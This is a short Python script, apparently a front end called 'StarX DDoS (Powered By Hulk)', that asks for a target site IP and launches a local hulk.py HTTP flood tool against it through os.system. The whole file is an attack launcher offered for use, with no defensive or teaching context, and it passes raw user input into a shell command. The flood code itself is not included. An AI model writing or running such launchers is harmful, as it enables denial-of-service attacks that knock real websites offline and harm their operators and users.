import subprocess
from colorama import init, Fore, Style
import os
import shutil
import sys
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
def run_ddos_attack():
    clear_console()
    print(Fore.MAGENTA + Style.BRIGHT + "╔══════════════════════════════════════╗")
    print(Fore.CYAN + Style.BRIGHT + "       StarX DDoS (Powered By Hulk)       ")
    print(Fore.MAGENTA + Style.BRIGHT + "╚══════════════════════════════════════╝")
    ip = input("Enter site ip for attack: ")
    possible_paths = [
        r"C:\Python27\python.exe",
        r"C:\Program Files\Python27\python.exe",
        r"C:\Program Files (x86)\Python27\python.exe"
    ]
    python2_path = None
    for path in possible_paths:
        if os.path.exists(path):
            python2_path = path
            break
    if not python2_path:
        print("Python 2 not found. Please install Python 2 or set the correct path manually.")
        sys.exit(1)
    hulk_path = os.path.abspath("programs/DDoS/hulk.py")
    os.system(f'{python2_path} {hulk_path} {ip}')
if __name__ == "__main__":
    run_ddos_attack()
